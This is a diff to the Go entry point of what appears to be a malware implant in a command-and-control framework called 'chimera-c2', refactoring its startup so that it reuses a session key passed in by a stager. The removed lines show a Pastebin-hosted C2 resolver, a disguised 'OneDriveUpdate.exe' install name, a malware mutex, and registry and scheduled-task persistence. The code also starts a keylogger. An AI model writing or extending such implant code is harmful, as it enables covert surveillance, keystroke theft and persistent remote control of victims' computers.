@@ -1,44 +1,32 @@
 package main
 
 import (
-	"net/http"
+	"encoding/base64"
 	"os"
 
-	"golang.org/x/sys/windows"
+	"github.com/terancebana/chimera-c2/implant/internal/common"
 )
 
-var RESOLVER_URL = "https://pastebin.com/raw/PNFkyRKV"
-var C2_ADDRESS = ""
-
-var staticKeyHex string // set via -ldflags "-X main.staticKeyHex=..."
-var STATIC_KEY []byte
-var SESSION_KEY []byte
-
-var certPinHex string // set via -ldflags "-X main.certPinHex=..."
-var CERT_PIN string
-var C2_TRANSPORT *http.Transport
-
-var AGENT_ID = ""
-
-var MUTEX_NAME = "Global\\MySecretMalwareMutex_v3"
-var mutexHandle windows.Handle
-var INSTALL_NAME = "OneDriveUpdate.exe"
-
 func main() {
-	installSelf()
+	common.LoadProfile()
+	common.ResolveC2()
 
-	if !checkForMutex() {
-		os.Exit(0)
+	// The stager delivers the session identity via environment
+	// variables (same process). Reuse it so we continue the
+	// session the stager established, instead of registering a
+	// second, orphaned agent.
+	if id := os.Getenv("CHIMERA_AGENT_ID"); id != "" {
+		common.AgentID = id
+		if sk := os.Getenv("CHIMERA_SESSION_KEY"); sk != "" {
+			if b, err := base64.StdEncoding.DecodeString(sk); err == nil {
+				common.SessionKey = b
+			}
+		}
+	} else {
+		// Standalone fallback (dev): mint a fresh identity + handshake.
+		common.AgentID = common.GenerateAgentID()
+		common.PerformHandshake()
 	}
-
-	loadProfile()
-
-	AGENT_ID = generateAgentID()
-
-	installRegistryPersistence()
-	installScheduledTask()
-
-	performHandshake()
 
 	go startKeylogger()
 
